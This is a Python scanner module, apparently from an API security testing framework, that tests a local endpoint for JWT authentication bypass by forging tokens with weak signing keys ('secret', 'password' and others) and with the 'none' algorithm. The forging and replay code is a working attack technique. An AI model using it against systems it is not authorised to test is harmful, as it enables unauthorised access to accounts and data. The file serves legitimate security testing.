
#!/usr/bin/env python3
"""
JWT Authentication Bypass Scanner
Target: GET /users/v1/me
Base URL: http://localhost:5002

This script tests for JWT authentication bypass vulnerabilities by:
1. Testing common weak signing keys
2. Attempting algorithm switching attacks
3. Checking for token validation issues
"""

import jwt
import time
import requests
from typing import Dict, List, Optional
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class JWTBypassScanner(BaseScanner):
    @staticmethod
    def scan(url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None) -> List[Dict]:
        logger = setup_scanner_logger("jwt_bypass")
        vulnerabilities = []
        
        # Create a test payload
        payload = {
            "sub": "test_user",
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600
        }
        
        logger.info("Testing JWT authentication bypass scenarios")
        
        # Test weak keys
        weak_keys = ["secret", "password", "123456", "key", "private"]
        for key in weak_keys:
            try:
                # Generate token with weak key
                token = jwt.encode(payload, key, algorithm="HS256")
                headers = {"Authorization": f"Bearer {token}"}
                
                test_response = requests.get(
                    f"{url}{path}",
                    headers=headers,
                    timeout=5
                )
                
                if test_response.status_code == 200:
                    vulnerabilities.append({
                        "type": "JWT_BYPASS",
                        "severity": "HIGH",
                        "detail": f"Successfully bypassed JWT auth using weak key: {key}",
                        "evidence": {
                            "url": f"{url}{path}",
                            "headers": headers,
                            "response": test_response.text
                        }
                    })
            
            except Exception as e:
                logger.error(f"Error testing weak key {key}: {str(e)}")
        
        # Test algorithm switching attack
        try:
            # Generate token with 'none' algorithm
            headers = {
                "typ": "JWT",
                "alg": "none"
            }
            token = jwt.encode(payload, "", algorithm="none", headers=headers)
            auth_headers = {"Authorization": f"Bearer {token}"}
            
            test_response = requests.get(
                f"{url}{path}",
                headers=auth_headers,
                timeout=5
            )
            
            if test_response.status_code == 200:
                vulnerabilities.append({
                    "type": "JWT_BYPASS",
                    "severity": "HIGH",
                    "detail": "Successfully bypassed JWT auth using 'none' algorithm",
                    "evidence": {
                        "url": f"{url}{path}",
                        "headers": auth_headers,
                        "response": test_response.text
                    }
                })
        
        except Exception as e:
            logger.error(f"Error testing algorithm switching: {str(e)}")

        return vulnerabilities

scan = JWTBypassScanner.scan
